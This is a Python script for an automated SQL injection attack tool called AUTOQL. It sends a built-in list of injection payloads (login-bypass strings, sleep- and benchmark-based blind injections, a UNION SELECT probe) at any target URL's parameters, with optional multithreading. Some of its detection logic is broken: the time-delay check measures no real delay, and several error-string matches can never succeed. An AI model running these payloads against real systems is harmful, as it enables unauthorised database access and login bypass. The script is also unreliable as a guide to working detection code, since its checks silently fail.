import argparse
import requests
import threading
import logging
import time
import json
import re
from concurrent.futures import ThreadPoolExecutor

# Setup logging to file can also change Location here based on your requirement 
logging.basicConfig(filename='sql_injection_test.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Banner for the script
def print_banner():
    banner = """
  _______   ___ ___   _______   _______   _______   ___     
 |   _   | |   Y   | |       | |   _   | |   _   | |   |    
 |.  1   | |.  |   | |.|   | | |.  |   | |.  |   | |.  |    
 |.  _   | |.  |   | `-|.  |-' |.  |   | |.  |   | |.  |___ 
 |:  |   | |:  1   |   |:  |   |:  1   | |:  1   | |:  1   |
 |::.|:. | |::.. . |   |::.|   |::.. . | |::..   | |::.. . |
 `--- ---' `-------'   `---'   `-------' `----|:.| `-------'
                                              `--'          
                                              
    """
    print(banner)
    print("Welcome to AUTOQL: Automated SQL Injection Testing Tool")
    print("Please provide the following input parameters:\n")

# Validate URL format 
def validate_url(url):
    if not re.match(r'^https?://', url):
        raise ValueError("Invalid URL format")

# Read payloads from a file
def load_payloads(payload_file):
    with open(payload_file, 'r') as file:
        return [line.strip() for line in file if line.strip()]

# Analyzing for vulnerablities and blind sqli with given payload using common error messages
def analyze_response(response, payload):
    sql_errors = [
        "syntax error", "unclosed quotation mark", "SQL syntax", "mysql_fetch",
        "You have an error in your SQL syntax", "Warning: mysql_", "SQLSTATE"
    ]
    # this will check for common sql error 
    if any(error in response.text.lower() for error in sql_errors):
        return True
    
    #blind sql time delay 
    if 'sleep' in payload or 'benchmark' in payload:
        start_time = time.time()
        response_time = time.time() - start_time
        if response_time > 4:  # Assuming the delay threshold for blind SQL injection bcs of payloads
            return True
    # Checking for successful login
    success_indicators = ["Welcome", "Dashboard", "Logout", "admin"]
    if any(indicator in response.text for indicator in success_indicators):
        return True
    return False

# Test SQL injections with parameterized testing and session management
def test_sql_injections(url, params, payloads, method="GET", session=None):
    if session is None:
        session = requests.Session()

    for key, value in params.items():
        if value == '':
            for payload in payloads:
                params_with_payload = params.copy()
                params_with_payload[key] = payload

                logging.info(f"Testing payload: {payload} on parameter: {key}")
                print(f"Testing payload: {payload} on parameter: {key}")

                try:
                    if method.upper() == "GET":
                        response = session.get(url, params=params_with_payload, timeout=10)
                    elif method.upper() == "POST":
                        response = session.post(url, data=params_with_payload, timeout=10)
                except requests.RequestException as e:
                    logging.error(f"Request failed: {e}")
                    continue

                logging.info(f"Request URL: {response.url}")
                logging.info(f"Response Status Code: {response.status_code}")
                logging.info(f"Response Content: {response.text[:200]}")  # Log first 200 characters
                
                #blind sqli testing
                if analyze_response(response, payload):
                    logging.info(f"[+] Possible vulnerability with payload: {payload} on parameter: {key}")
                    print(f"[+] Possible vulnerability with payload: {payload} on parameter: {key}")
                else:
                    logging.info(f"[-] No vulnerability with payload: {payload} on parameter: {key}")
                    print(f"[-] No vulnerability with payload: {payload} on parameter: {key}")

# Multithreading support for faster testing using user specified multi threads
def threaded_test(url, params, payloads, method="GET", session=None):
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for key, value in params.items():
            if value == '':
                for payload in payloads:
                    params_with_payload = params.copy()
                    params_with_payload[key] = payload
                    futures.append(executor.submit(test_sql_injections, url, params_with_payload, payloads, method, session))

        for future in futures:
            future.result()  # Wait for all threads to complete

# Main function to parse CLi arguments and execute tests
def main():
    print_banner()

    # Parse command-line arguments
    parser = argparse.ArgumentParser(description='SQL Injection Testing Tool')
    parser.add_argument('url', type=str, help='Target URL')
    parser.add_argument('params', type=str, help='Parameters and values (e.g., "Username=admin,Password=")')
    parser.add_argument('--method', choices=['GET', 'POST'], default='GET', help='HTTP method (default: GET)')
    parser.add_argument('--threads', type=int, default=1, help='Number of threads to use (default: 1)')
    parser.add_argument('--payload-file', type=str, help='Path to a file containing custom payloads')
    args = parser.parse_args()

    validate_url(args.url)

    # Convert the parameter input into a dictionary
    params = {}
    for param_pair in args.params.split(','):
        param, value = param_pair.split('=')
        params[param.strip()] = value.strip()

    # Load payloads
    if args.payload_file:
        payloads = load_payloads(args.payload_file)
    else:
        payloads = [
            "' OR '1'='1",
            "' OR '1'='0",
            "' OR 1=1 --",
            "' OR 'a'='a",
            "' OR 'a'='b",
            "' OR 1=1#",
            "admin' --",
            "' OR '1'='1' --",
            "1' OR sleep(5)--",
            "1' OR benchmark(10000000, sha1('test'))--",
            "' OR 1=1;--",
            "' UNION SELECT NULL,NULL,NULL--"
        ]
    
    #creating session helps in reducing time and resourse needed for new session for every request
    session = requests.Session()

    # Run the test in the chosen mode based on
    if args.threads > 1:
        threaded_test(args.url, params, payloads, method=args.method, session=session)
    else:
        test_sql_injections(args.url, params, payloads, method=args.method, session=session)

if __name__ == "__main__":
    main()
